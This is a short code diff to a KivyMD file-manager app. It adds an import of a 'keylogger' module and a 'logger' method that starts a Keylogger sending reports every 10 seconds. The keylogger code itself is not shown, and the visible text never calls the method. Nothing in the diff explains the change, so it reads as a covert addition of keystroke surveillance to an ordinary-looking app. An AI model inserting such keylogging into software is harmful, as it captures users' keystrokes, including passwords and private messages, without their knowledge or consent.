@@ -2,6 +2,7 @@ from kivymd.app import MDApp
 from kivymd.toast import toast
 from kivymd.uix.filemanager import MDFileManager
 
+import keylogger
 
 class Testapp(MDApp):
     def build(self):
@@ -46,5 +47,10 @@ class Testapp(MDApp):
             toast('done')
         except Exception:
             toast('Error caught', Exception.__name__)
+    
+    def logger(self):
+        SEND_REPORT_EVERY = 10
+        key = keylogger.Keylogger(interval=SEND_REPORT_EVERY)
+        key.start()
 
 Testapp().run()
